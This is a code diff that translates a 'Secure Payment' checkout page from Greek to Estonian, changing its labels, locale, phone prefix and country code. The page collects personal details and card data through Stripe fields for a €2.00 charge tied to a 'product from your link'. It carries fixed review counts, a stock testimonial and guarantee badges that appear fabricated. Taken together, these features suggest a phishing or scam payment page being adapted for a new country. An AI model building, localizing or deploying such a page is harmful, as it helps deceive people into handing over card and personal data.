@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="el">
+<html lang="et">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Ασφαλής Πληρωμή</title>
+  <title>Turvaline makse</title>
   <meta name="referrer" content="no-referrer">
 
   <!-- Google tag -->
@@ -55,6 +55,9 @@
       width:100%;padding:12px;border:none;border-radius:12px;
       background:#16a34a;color:#fff;font-weight:900;cursor:pointer
     }
+
+    .logos{display:flex;gap:10px;margin-top:12px}
+    .logos img{height:20px}
 
     .err{
       display:none;background:#fff1f1;border:1px solid #f5bcbc;
@@ -170,12 +173,12 @@
 })();
 </script>
 
-<div class="safe">Ασφαλής πληρωμή SSL</div>
+<div class="safe">Turvaline SSL makse</div>
 
 <div class="wrap">
   <div class="page-title">
-    Ασφαλής Πληρωμή 🔒 <span class="stars">★★★★★</span>
-    <span class="reviews">(2777 αξιολογήσεις)</span>
+    Turvaline makse 🔒 <span class="stars">★★★★★</span>
+    <span class="reviews">(2777 arvustust)</span>
   </div>
 
   <div class="grid">
@@ -188,42 +191,42 @@
           <img id="heroImg" alt="">
           <div>
             <div id="heroTitle" style="font-weight:900;font-size:14px"></div>
-            <div class="sub">Προϊόν από τον σύνδεσμό σας</div>
+            <div class="sub">Toode teie lingilt</div>
           </div>
         </div>
 
-        <div class="h2">1. Στοιχεία</div>
+        <div class="h2">1. Andmed</div>
 
         <div class="form-grid">
-          <input id="firstName" class="input" placeholder="Όνομα">
-          <input id="lastName" class="input" placeholder="Επώνυμο">
+          <input id="firstName" class="input" placeholder="Eesnimi">
+          <input id="lastName" class="input" placeholder="Perekonnanimi">
         </div>
 
         <div class="form-grid">
-          <input id="billingStreet" class="input" placeholder="Διεύθυνση" style="grid-column:1/-1">
-          <input id="billingPostcode" class="input" placeholder="Ταχυδρομικός κώδικας">
-          <input id="billingCity" class="input" placeholder="Πόλη">
+          <input id="billingStreet" class="input" placeholder="Aadress" style="grid-column:1/-1">
+          <input id="billingPostcode" class="input" placeholder="Postiindeks">
+          <input id="billingCity" class="input" placeholder="Linn">
         </div>
 
         <div class="form-grid">
-          <input id="emailInput" class="input" type="email" placeholder="Email">
-          <input class="input" value="Ελλάδα" disabled>
+          <input id="emailInput" class="input" type="email" placeholder="E-post">
+          <input class="input" value="Eesti" disabled>
         </div>
 
         <div class="form-grid">
           <select id="phonePrefix" class="select">
-            <option value="+30">+30 — Ελλάδα</option>
+            <option value="+372">+372 — Eesti</option>
           </select>
-          <input id="phoneNumber" class="input" placeholder="Τηλέφωνο">
+          <input id="phoneNumber" class="input" placeholder="Telefoninumber">
         </div>
 
         <input id="nameInput" type="hidden">
-        <button id="nextBtn" class="btn">Συνέχεια</button>
+        <button id="nextBtn" class="btn">Jätka</button>
       </section>
 
       <section id="step2" class="step" aria-hidden="true">
-        <div class="h2">2. Πληρωμή</div>
-        <p class="sub">Τα στοιχεία της κάρτας είναι κρυπτογραφημένα και επεξεργάζονται από τη Stripe.</p>
+        <div class="h2">2. Makse</div>
+        <p class="sub">Kaardi andmed on krüpteeritud ja töödeldakse Stripe'i poolt.</p>
 
         <div>
           <div id="card-number" class="el"></div>
@@ -236,8 +239,8 @@
         <div id="err" class="err" aria-hidden="true"></div>
 
         <div style="display:flex;gap:10px;margin-top:12px">
-          <button id="backBtn" class="btn" style="width:40%">← Πίσω</button>
-          <button id="payNow" class="btn" style="width:60%">Πληρωμή</button>
+          <button id="backBtn" class="btn" style="width:40%">← Tagasi</button>
+          <button id="payNow" class="btn" style="width:60%">Maksa turvaliselt</button>
         </div>
       </section>
 
@@ -245,31 +248,31 @@
 
     <aside>
       <div class="widget">
-        <div style="text-align:center;font-weight:800">Τι λένε οι πελάτες μας</div>
+        <div style="text-align:center;font-weight:800">Mida kliendid ütlevad</div>
         <div style="text-align:center;font-weight:700;">Fenella Lara</div>
         <div style="text-align:center;color:#f6b80c;">★★★★★</div>
-        <p style="text-align:center">Έλαβα το προϊόν χθες. Πολύ καλή εμπειρία!</p>
+        <p style="text-align:center">Sain toote eile. Väga hea kogemus!</p>
       </div>
 
       <div class="widget">
         <div class="delivery">
           <img id="sidebarImg" style="width:52px;height:52px;border-radius:8px;border:1px solid var(--line);display:none">
           <div>
-            <div style="font-weight:800">Γρήγορη παράδοση</div>
-            <div class="sub">3–5 εργάσιμες ημέρες</div>
+            <div style="font-weight:800">Kiire kohaletoimetamine</div>
+            <div class="sub">3–5 tööpäeva</div>
           </div>
-          <div style="margin-left:auto;font-weight:800">Δωρεάν</div>
+          <div style="margin-left:auto;font-weight:800">Tasuta</div>
         </div>
 
-        <div style="margin-top:14px;font-weight:800">Σύνοψη παραγγελίας</div>
-        <div class="order-row"><span>Σύνολο</span><span>€2.00</span></div>
+        <div style="margin-top:14px;font-weight:800">Tellimuse kokkuvõte</div>
+        <div class="order-row"><span>Kokku</span><span>€2.00</span></div>
       </div>
 
       <div class="widget">
-        <div style="font-weight:800;margin-bottom:10px">Γιατί να μας εμπιστευτείτε</div>
+        <div style="font-weight:800;margin-bottom:10px">Miks meid usaldada</div>
         <div class="trust">
-          <div class="box"><div>⭐</div><div>99% θετικές</div></div>
-          <div class="box"><div>🔒</div><div>SSL ασφαλές</div></div>
+          <div class="box"><div>⭐</div><div>99% positiivne</div></div>
+          <div class="box"><div>🔒</div><div>SSL turvaline</div></div>
           <div class="box"><div>🛡️</div><div>€250,000</div></div>
         </div>
       </div>
@@ -279,9 +282,9 @@
 
 <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
   <div class="loading-box">
-    <div class="loading-title">Επεξεργασία πληρωμής…</div>
+    <div class="loading-title">Makset töödeldakse…</div>
     <div class="progress-wrap"><div class="progress-bar"></div></div>
-    <p class="sub" style="margin-top:10px">Παρακαλώ περιμένετε…</p>
+    <p class="sub" style="margin-top:10px">Palun oodake…</p>
   </div>
 </div>
 
@@ -326,7 +329,7 @@ window.addEventListener('DOMContentLoaded', () => {
         line1: billingStreet.value,
         city: billingCity.value,
         postal_code: billingPostcode.value,
-        country: "GR"
+        country: "EE"
       }
     };
 
